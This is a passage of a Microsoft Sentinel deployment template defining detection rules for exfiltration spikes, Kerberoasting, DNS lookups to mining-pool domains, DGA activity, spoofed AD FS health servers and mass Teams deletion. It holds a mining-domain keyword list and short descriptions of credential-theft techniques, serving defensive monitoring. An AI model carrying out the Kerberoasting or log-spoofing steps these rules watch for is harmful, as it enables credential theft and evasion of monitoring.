          "query": "let starttime = 14d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet scorethreshold = 5;\nlet bytessentperhourthreshold = 10;\nlet TimeSeriesData = (union isfuzzy=true\n(\nVMConnection\n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where isnotempty(DestinationIp) and isnotempty(SourceIp)\n| extend SourceIP = SourceIp, DestinationIP = DestinationIp\n| where ipv4_is_private(DestinationIP) == false\n| extend DeviceVendor = \"VMConnection\"\n| project TimeGenerated, BytesSent, DeviceVendor\n| make-series TotalBytesSent=sum(BytesSent) on TimeGenerated from startofday(ago(starttime)) to startofday(ago(endtime)) step timeframe by DeviceVendor\n),\n(\nCommonSecurityLog\n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where isnotempty(DestinationIP) and isnotempty(SourceIP)\n| where ipv4_is_private(DestinationIP) == false\n| project TimeGenerated, SentBytes, DeviceVendor\n| make-series TotalBytesSent=sum(SentBytes) on TimeGenerated from startofday(ago(starttime)) to startofday(ago(endtime)) step timeframe by DeviceVendor\n)\n);\n//Filter anomolies against TimeSeriesData\nlet TimeSeriesAlerts = materialize(TimeSeriesData\n| extend (anomalies, score, baseline) = series_decompose_anomalies(TotalBytesSent, scorethreshold, -1, 'linefit')\n| mv-expand TotalBytesSent to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double),score to typeof(double), baseline to typeof(long)\n| where anomalies > 0 | extend AnomalyHour = TimeGenerated\n| extend TotalBytesSentinMBperHour = round(((TotalBytesSent / 1024)/1024),2), baselinebytessentperHour = round(((baseline / 1024)/1024),2), score = round(score,2)\n| project DeviceVendor, AnomalyHour, TimeGenerated, TotalBytesSentinMBperHour, baselinebytessentperHour, anomalies, score);\nlet AnomalyHours = materialize(TimeSeriesAlerts  | where TimeGenerated > ago(2d) | project TimeGenerated);\n//Union of all BaseLogs aggregated per hour\nlet BaseLogs = (union isfuzzy=true\n(\nCommonSecurityLog\n| where isnotempty(DestinationIP) and isnotempty(SourceIP)\n| where TimeGenerated > ago(2d)\n| extend DateHour = bin(TimeGenerated, 1h) // create a new column and round to hour\n| where DateHour in ((AnomalyHours)) //filter the dataset to only selected anomaly hours\n| where ipv4_is_private(DestinationIP) == false\n| extend SentBytesinMB = ((SentBytes / 1024)/1024), ReceivedBytesinMB = ((ReceivedBytes / 1024)/1024)\n| summarize HourlyCount = count(), TimeGeneratedMax=arg_max(TimeGenerated, *), DestinationIPList=make_set(DestinationIP, 100), DestinationPortList = make_set(DestinationPort,100), TotalSentBytesinMB = sum(SentBytesinMB), TotalReceivedBytesinMB = sum(ReceivedBytesinMB) by SourceIP, DeviceVendor, TimeGeneratedHour=bin(TimeGenerated,1h)\n| where TotalSentBytesinMB > bytessentperhourthreshold\n| sort by TimeGeneratedHour asc, TotalSentBytesinMB desc\n| extend Rank=row_number(1, prev(TimeGeneratedHour) != TimeGeneratedHour) // Ranking the dataset per Hourly Partition\n| where Rank < 10  // Selecting Top 10 records with Highest BytesSent in each Hour\n| project DeviceVendor, TimeGeneratedHour, TimeGeneratedMax, SourceIP, DestinationIPList, DestinationPortList, TotalSentBytesinMB, TotalReceivedBytesinMB, Rank\n),\n(\nVMConnection\n| where isnotempty(DestinationIp) and isnotempty(SourceIp)\n| where TimeGenerated > ago(2d)\n| extend DateHour = bin(TimeGenerated, 1h) // create a new column and round to hour\n| where DateHour in ((AnomalyHours)) //filter the dataset to only selected anomaly hours\n| extend SourceIP = SourceIp, DestinationIP = DestinationIp\n| where ipv4_is_private(DestinationIP) == false | extend DeviceVendor = \"VMConnection\"\n| extend SentBytesinMB = ((BytesSent / 1024)/1024), ReceivedBytesinMB = ((BytesReceived / 1024)/1024)\n| summarize HourlyCount = count(),TimeGeneratedMax=arg_max(TimeGenerated, *), DestinationIPList=make_set(DestinationIP, 100), DestinationPortList = make_set(DestinationPort, 100), TotalSentBytesinMB = sum(SentBytesinMB),TotalReceivedBytesinMB = sum(ReceivedBytesinMB) by SourceIP, DeviceVendor, TimeGeneratedHour=bin(TimeGenerated,1h)\n| where TotalSentBytesinMB > bytessentperhourthreshold\n| sort by TimeGeneratedHour asc, TotalSentBytesinMB desc\n| extend Rank=row_number(1, prev(TimeGeneratedHour) != TimeGeneratedHour) // Ranking the dataset per Hourly Partition\n| where Rank < 10  // Selecting Top 10 records with Highest BytesSent in each Hour\n| project DeviceVendor, TimeGeneratedHour, TimeGeneratedMax, SourceIP, DestinationIPList, DestinationPortList, TotalSentBytesinMB, TotalReceivedBytesinMB, Rank\n)\n);\n// Join against base logs to retrive records associated with the hour of anomoly\nTimeSeriesAlerts\n| where TimeGenerated > ago(2d)\n| join (\n    BaseLogs | extend AnomalyHour = TimeGeneratedHour\n) on DeviceVendor, AnomalyHour | sort by score desc\n// Removes MICROSOFT-CORP-MSN-AS-BLOCK, CDT, Akamai/Adobe added by AMayor 6/10/24\n| where DestinationIPList !in (\"40.112.242.140\", \" 13.66.147.148\", \" 40.78.253.213\", \" 20.40.206.136\", \" 52.245.215.126\", \" 20.83.192.210\", \" 20.158.5.80\", \" 52.233.105.184\", \" 20.189.172.20\", \" 40.78.243.18\", \" 20.140.137.181\", \" 20.83.192.209\", \" 169.254.169.254\", \" 40.83.240.146\", \" 40.119.249.228\", \" 100.114.12.97\", \" 20.141.95.88\", \" 20.140.200.208\", \" 20.140.95.0\", \" 20.140.137.182\", \" 20.140.137.183\", \" 20.140.137.180\", \" 40.64.132.128\", \" 20.141.120.181\", \" 146.75.42.172\", \" 20.50.201.205\", \" 20.140.134.64\", \" 172.66.0.26\", \" 20.40.206.131\", \" 52.245.172.63\", \" 20.190.151.69\", \" 20.140.134.65\", \" 20.42.65.93\", \" 239.255.255.250\", \" 169.254.169.253\", \" 51.116.253.168\", \" 20.189.173.23\", \" 23.213.36.145\"\n)\n| project DeviceVendor, AnomalyHour,TimeGeneratedMax, SourceIP, DestinationIPList, DestinationPortList, TotalSentBytesinMB, TotalReceivedBytesinMB, TotalBytesSentinMBperHour, baselinebytessentperHour, score, anomalies\n| summarize EventCount = count(), StartTimeUtc= min(TimeGeneratedMax), EndTimeUtc= max(TimeGeneratedMax), SourceIPMax= arg_max(SourceIP,*), TotalBytesSentinMB = sum(TotalSentBytesinMB), TotalBytesReceivedinMB = sum(TotalReceivedBytesinMB), SourceIPList = make_set(SourceIP, 100), DestinationIPList = make_set(DestinationIPList, 100) by AnomalyHour,TotalBytesSentinMBperHour, baselinebytessentperHour, score, anomalies\n| project DeviceVendor, AnomalyHour, StartTimeUtc, EndTimeUtc, SourceIPMax, SourceIPList, DestinationIPList, DestinationPortList, TotalBytesSentinMB, TotalBytesReceivedinMB, TotalBytesSentinMBperHour, baselinebytessentperHour, score, anomalies, EventCount\n| extend timestamp =EndTimeUtc, IPCustomEntity = SourceIPMax",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 1,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1030"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "f2dd4a3a-ebac-4994-9499-1a859938c947",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6750b30d-6c86-4751-a836-d843f2c081ed')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6750b30d-6c86-4751-a836-d843f2c081ed')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Kerberoasting",
          "description": "A service principal name (SPN) is used to uniquely identify a service instance in a Windows environment.\nEach SPN is usually associated with a service account. Organizations may have used service accounts with weak passwords in their environment.\nAn attacker can try requesting Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC) which contains a hash of the Service account. This can then be used for offline cracking.\nThis hunting query looks for accounts that are generating excessive requests to different resources within the last hour compared with the previous 24 hours.  Normal users would not make an unusually large number of request within a small time window. This is based on 4769 events which can be very noisy so environment based tweaking might be needed.",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 1d;\nlet endtime = 1h;\nlet prev23hThreshold = 4;\nlet prev1hThreshold = 15;\nlet Kerbevent = (union isfuzzy=true\n(SecurityEvent\n| where TimeGenerated >= ago(starttime)\n| where EventID == 4769\n| parse EventData with * 'TicketEncryptionType\">' TicketEncryptionType \"<\" *\n| where TicketEncryptionType == '0x17'\n| parse EventData with * 'TicketOptions\">' TicketOptions \"<\" *\n| where TicketOptions == '0x40810000'\n| parse EventData with * 'Status\">' Status \"<\" *\n| where Status == '0x0'\n| parse EventData with * 'ServiceName\">' ServiceName \"<\" *\n| where ServiceName !contains \"$\" and ServiceName !contains \"krbtgt\"\n| parse EventData with * 'TargetUserName\">' TargetUserName \"<\" *\n| where TargetUserName !contains \"$@\" and TargetUserName !contains ServiceName\n| parse EventData with * 'IpAddress\">::ffff:' ClientIPAddress \"<\" *\n),\n(\nWindowsEvent\n| where TimeGenerated >= ago(starttime)\n| where EventID == 4769 and EventData has '0x17' and EventData has '0x40810000' and EventData has 'krbtgt'\n| extend TicketEncryptionType = tostring(EventData.TicketEncryptionType)\n| where TicketEncryptionType == '0x17'\n| extend TicketOptions = tostring(EventData.TicketOptions)\n| where TicketOptions == '0x40810000'\n| extend Status = tostring(EventData.Status)\n| where Status == '0x0'\n| extend ServiceName = tostring(EventData.ServiceName)\n| where ServiceName !contains \"$\" and ServiceName !contains \"krbtgt\"\n| extend TargetUserName = tostring(EventData.TargetUserName)\n| where TargetUserName !contains \"$@\" and TargetUserName !contains ServiceName\n| extend ClientIPAddress = tostring(EventData.IpAddress)\n));\nlet Kerbevent23h = Kerbevent\n| where TimeGenerated >= ago(starttime) and TimeGenerated < ago(endtime)\n| summarize ServiceNameCountPrev23h = dcount(ServiceName), ServiceNameSet23h = makeset(ServiceName)\nby Computer, TargetUserName,TargetDomainName, ClientIPAddress, TicketOptions, TicketEncryptionType, Status\n| where ServiceNameCountPrev23h < prev23hThreshold;\nlet Kerbevent1h =\nKerbevent\n| where TimeGenerated >= ago(endtime)\n| summarize min(TimeGenerated), max(TimeGenerated), ServiceNameCountPrev1h = dcount(ServiceName), ServiceNameSet1h = makeset(ServiceName)\nby Computer, TargetUserName, TargetDomainName, ClientIPAddress, TicketOptions, TicketEncryptionType, Status;\nKerbevent1h\n| join kind=leftanti\n(\nKerbevent23h\n) on TargetUserName, TargetDomainName\n// Threshold value set above is based on testing, this value may need to be changed for your environment.\n| where ServiceNameCountPrev1h > prev1hThreshold\n| project StartTime = min_TimeGenerated, EndTime = max_TimeGenerated, TargetUserName, Computer, ClientIPAddress, TicketOptions,\nTicketEncryptionType, Status, ServiceNameCountPrev1h, ServiceNameSet1h, TargetDomainName\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n| extend TargetAccount = strcat(TargetDomainName,  \"\\\\\", TargetUserName)\n| project-away DomainIndex\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1558"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "1572e66b-20a7-4012-9ec4-77ec4b101bc8",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetAccount"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "TargetDomainName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetUserName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/03de1291-d5f8-4122-af38-d2ab891f0d3f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/03de1291-d5f8-4122-af38-d2ab891f0d3f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NRT DNS events related to mining pools",
          "description": "Identifies IP addresses that may be performing DNS lookups associated with common currency mining pools.",
          "severity": "Low",
          "enabled": true,
          "query": "DnsEvents\n| where Name contains \".\"\n| where Name has_any (\"monerohash.com\", \"do-dear.com\", \"xmrminerpro.com\", \"secumine.net\", \"xmrpool.com\", \"minexmr.org\", \"hashanywhere.com\",\n\"xmrget.com\", \"mininglottery.eu\", \"minergate.com\", \"moriaxmr.com\", \"multipooler.com\", \"moneropools.com\", \"xmrpool.eu\", \"coolmining.club\",\n\"supportxmr.com\", \"minexmr.com\", \"hashvault.pro\", \"xmrpool.net\", \"crypto-pool.fr\", \"xmr.pt\", \"miner.rocks\", \"walpool.com\", \"herominers.com\",\n\"gntl.co.uk\", \"semipool.com\", \"coinfoundry.org\", \"cryptoknight.cc\", \"fairhash.org\", \"baikalmine.com\", \"tubepool.xyz\", \"fairpool.xyz\", \"asiapool.io\",\n\"coinpoolit.webhop.me\", \"nanopool.org\", \"moneropool.com\", \"miner.center\", \"prohash.net\", \"poolto.be\", \"cryptoescrow.eu\", \"monerominers.net\", \"cryptonotepool.org\",\n\"extrmepool.org\", \"webcoin.me\", \"kippo.eu\", \"hashinvest.ws\", \"monero.farm\", \"supportxmr.com\", \"xmrpool.eu\", \"linux-repository-updates.com\", \"1gh.com\",\n\"dwarfpool.com\", \"hash-to-coins.com\", \"hashvault.pro\", \"pool-proxy.com\", \"hashfor.cash\", \"fairpool.cloud\", \"litecoinpool.org\", \"mineshaft.ml\", \"abcxyz.stream\",\n\"moneropool.ru\", \"cryptonotepool.org.uk\", \"extremepool.org\", \"extremehash.com\", \"hashinvest.net\", \"unipool.pro\", \"crypto-pools.org\", \"monero.net\",\n\"backup-pool.com\", \"mooo.com\", \"freeyy.me\", \"cryptonight.net\", \"shscrypto.net\")\n| extend HostName = iff(Computer has '.', substring(Computer,0,indexof(Computer,'.')),Computer)\n| extend DnsDomain = iff(Computer has '.', substring(Computer,indexof(Computer,'.')+1),\"\")\n",
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1496"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "d5b32cd4-2328-43da-ab47-cd289c1f5efc",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/17b37aa4-74fb-4297-8fcc-131cb1554461')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/17b37aa4-74fb-4297-8fcc-131cb1554461')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential DGA detected",
          "description": "Identifies clients with a high NXDomain count, which could be indicative of a DGA (cycling through possible C2 domains where most C2s are not live).\nAlerts are generated when a new IP address is seen (based on not being associated with\nNXDomain records in the prior 10-day baseline period).",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 10d;\nlet endtime = 1d;\nlet threshold = 100;\nlet nxDomainDnsEvents = DnsEvents\n// ResultCode 3 => 'NXDOMAIN'\n| where ResultCode == 3\n| where QueryType in~ (\"A\", \"AAAA\")\n| where ipv4_is_match(\"127.0.0.1\", ClientIP) == False\n| where Name !has \"/\"\n| where Name has \".\";\nnxDomainDnsEvents\n| where TimeGenerated > ago(endtime)\n// sld = Second Level Domain\n| extend sld = tostring(split(Name, \".\")[-2])\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), dcount(sld), sampleNXDomainList=make_set(Name, 100) by ClientIP\n| where dcount_sld > threshold\n// Filter out previously seen IPs\n// Returns all the records from the left side that don't have matches from the right\n| join kind=leftanti (nxDomainDnsEvents\n    | where TimeGenerated between(ago(starttime)..ago(endtime))\n    | extend sld = tostring(split(Name, \".\")[-2])\n    | summarize dcount(sld) by ClientIP, bin(TimeGenerated,1d)\n    | where dcount_sld > threshold\n    ) on ClientIP\n    | order by dcount_sld desc\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P10D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1568",
            "T1008"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a0907abe-6925-4d90-af2b-c7e89dc201a6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b651f2ee-5fbe-4048-8b3c-bb9a50098b04')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b651f2ee-5fbe-4048-8b3c-bb9a50098b04')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Microsoft Entra ID Hybrid Health AD FS Service Delete",
          "description": "This detection uses AzureActivity logs (Administrative category) to identify the deletion of an Microsoft Entra ID Hybrid Health AD FS service instance in a tenant.\nA threat actor can create a new AD Health ADFS service and create a fake server to spoof AD FS signing logs.\nThe health AD FS service can then be deleted after it is no longer needed via HTTP requests to Azure.\nMore information is available in this blog https://o365blog.com/post/hybridhealthagent/",
          "severity": "Medium",
          "enabled": true,
          "query": "AzureActivity\n| where CategoryValue =~ 'Administrative'\n| where ResourceProviderValue =~ 'Microsoft.ADHybridHealthService'\n| where _ResourceId has 'AdFederationService'\n| where OperationNameValue =~ 'Microsoft.ADHybridHealthService/services/delete'\n| extend claimsJson = parse_json(Claims)\n| extend AppId = tostring(claimsJson.appid), AccountName = tostring(claimsJson.name), Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n| project-away claimsJson\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [
            "T1578.003"
          ],
          "alertRuleTemplateName": "86a036b2-3686-42eb-b417-909fc0867771",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CallerIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/1f68d513-523f-4fc4-9741-1dd2f3e4c6ae')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/1f68d513-523f-4fc4-9741-1dd2f3e4c6ae')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Multiple Teams deleted by a single user",
          "description": "This detection flags the occurrences of deleting multiple teams within an hour.\nThis data is a part of Office 365 Connector in Microsoft Sentinel.",
          "severity": "Low",
          "enabled": true,
          "query": "// Adjust this value to change how many Teams should be deleted before including\nlet max_delete_count = 3;\n// Adjust this value to change the timewindow the query runs over\n  OfficeActivity\n| where OfficeWorkload =~ \"MicrosoftTeams\"\n| where Operation =~ \"TeamDeleted\"\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), DeletedTeams = make_set(TeamName, 1000) by UserId\n| where array_length(DeletedTeams) > max_delete_count\n| extend AccountName = tostring(split(UserId, \"@\")[0]), AccountUPNSuffix = tostring(split(UserId, \"@\")[1])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1485",
            "T1489"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "173f8699-6af5-484a-8b06-8c47ba89b380",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserId"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b21f230c-e165-406a-9e02-41eb007664cc')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b21f230c-e165-406a-9e02-41eb007664cc')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NRT Microsoft Entra ID Hybrid Health AD FS New Server",
          "description": "This detection uses AzureActivity logs (Administrative category) to identify the creation or update of a server instance in an Microsoft Entra ID Hybrid Health AD FS service.\nA threat actor can create a new AD Health ADFS service and create a fake server instance to spoof AD FS signing logs. There is no need to compromise an on-premises AD FS server.\nThis can be done programmatically via HTTP requests to Azure. More information in this blog: https://o365blog.com/post/hybridhealthagent/",
          "severity": "Medium",
          "enabled": true,
          "query": "AzureActivity\n| where CategoryValue =~ 'Administrative'\n| where ResourceProviderValue =~ 'Microsoft.ADHybridHealthService'\n| where _ResourceId has 'AdFederationService'\n| where OperationNameValue =~ 'Microsoft.ADHybridHealthService/services/servicemembers/action'\n| extend claimsJson = parse_json(Claims)\n| extend AppId = tostring(claimsJson.appid), AccountName = tostring(claimsJson.name), Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n| project-away claimsJson\n",
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "ec491363-5fe7-4eff-b68e-f42dcb76fcf6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CallerIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6481773a-e9d9-41b4-b65e-89a493c1b31f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6481773a-e9d9-41b4-b65e-89a493c1b31f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Sign-ins from IPs that attempt sign-ins to disabled accounts",
          "description": "Identifies IPs with failed attempts to sign in to one or more disabled accounts using the IP through which successful signins from other accounts have happened.\nThis could indicate an attacker who obtained credentials for a list of accounts and is attempting to login with those accounts, some of which may have already been disabled.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\n50057 - User account is disabled. The account has been disabled by an administrator.\nThis query has also been updated to include UEBA logs IdentityInfo and BehaviorAnalytics for contextual information around the results.",
          "severity": "Medium",
          "enabled": true,
          "query": "let aadFunc = (tableName: string) {\nlet failed_signins = table(tableName)\n| where ResultType == \"50057\"\n| where ResultDescription == \"User account is disabled. The account has been disabled by an administrator.\";\nlet disabled_users = failed_signins | summarize by UserPrincipalName;\ntable(tableName)\n  | where ResultType == 0\n  | where isnotempty(UserPrincipalName)\n  | where UserPrincipalName !in (disabled_users)\n| summarize\n        successfulAccountsTargettedCount = dcount(UserPrincipalName),\n        successfulAccountSigninSet = make_set(UserPrincipalName, 100),\n        successfulApplicationSet = make_set(AppDisplayName, 100)\n    by IPAddress, Type\n    // Assume IPs associated with sign-ins from 100+ distinct user accounts are safe\n    | where successfulAccountsTargettedCount < 50\n    | where isnotempty(successfulAccountsTargettedCount)\n  | join kind=inner (failed_signins\n| summarize\n    StartTime = min(TimeGenerated),\n    EndTime = max(TimeGenerated),\n    totalDisabledAccountLoginAttempts = count(),\n    disabledAccountsTargettedCount = dcount(UserPrincipalName),\n    applicationsTargeted = dcount(AppDisplayName),\n    disabledAccountSet = make_set(UserPrincipalName, 100),\n    disabledApplicationSet = make_set(AppDisplayName, 100)\nby 